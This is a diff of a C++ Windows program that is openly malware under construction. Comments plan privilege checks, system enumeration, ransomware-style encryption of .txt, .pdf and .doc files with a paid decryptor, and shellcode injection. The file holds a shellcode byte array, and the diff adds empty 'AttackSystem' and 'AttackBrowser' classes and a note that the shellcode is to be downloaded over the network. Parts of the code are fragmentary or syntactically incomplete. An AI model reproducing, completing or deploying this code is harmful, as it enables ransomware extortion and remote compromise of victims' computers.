@@ -1,15 +1,15 @@
 #include <windows.h>
-#include <stdio.h>
+#include <iostream>
 #include <vector>
-
+#include <string>
 
 // first check self privileges
 // dumping system schema (enumerating system environment and dumping in pretty format)
 // encrypt all the files with extension of .txt, .pdf, .doc + decryption program in case of pay. (imitating ransomware)
 // shellcode injection last step
+using namespace std;
 
-
-
+// this shellcode must be downloded over network dynamically 
 unsigned char buf[] = 
 "\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"
 "\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
@@ -45,6 +45,13 @@ unsigned char buf[] =
 "\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb"
 "\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5";
 
+class AttackSystem{
+
+}
+
+class AttackBrowser{
+    
+}
 
 void test(){
 DWORD old=0;
@@ -75,9 +82,6 @@ int main(){
         NULL                              // Template file
     );
 
-    if (hFile == INVALID_HANDLE_VALUE) {
-        printf("Failed to create file. Error: %lu\n", GetLastError());
-        return 1;
-    }
+    
     return 0;
 }
